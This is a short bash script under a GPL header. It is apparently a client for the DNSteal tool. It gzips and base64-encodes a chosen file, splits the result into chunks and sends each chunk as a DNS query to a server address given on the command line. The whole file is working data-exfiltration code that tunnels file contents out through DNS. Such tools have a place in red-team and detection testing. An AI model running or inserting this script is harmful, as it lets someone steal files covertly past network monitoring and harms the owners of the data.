#!/bin/bash
# Copyright (C) 2025 CEA - All Rights Reserved
# 
# This program is free software: you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation, either version 3 of the License, or (at your option) any later
# version.
# 
# This program is distributed in the hope that it will be useful, but WITHOUT ANY
# WARRANTY; without even the implied warranty of  MERCHANTABILITY or FITNESS FOR
# A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License along with
# this program.  If not, see <http://www.gnu.org/licenses/>.


DNSteal_ip="$1"
file_path="$2"
filename="$3"

cd "$file_path";

s=4;
b=57;
c=0;

for r in $(for i in $(gzip -c "$filename"| base64 -w0 | sed "s/.\{$b\}/&\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\n$i-."; c=1; fi; done ); do 
	nslookup -type=a `echo -ne $r"$filename" | tr "+" "*"` "$DNSteal_ip" | grep 'Address: ' | cut -d ' ' -f 2 ; 
done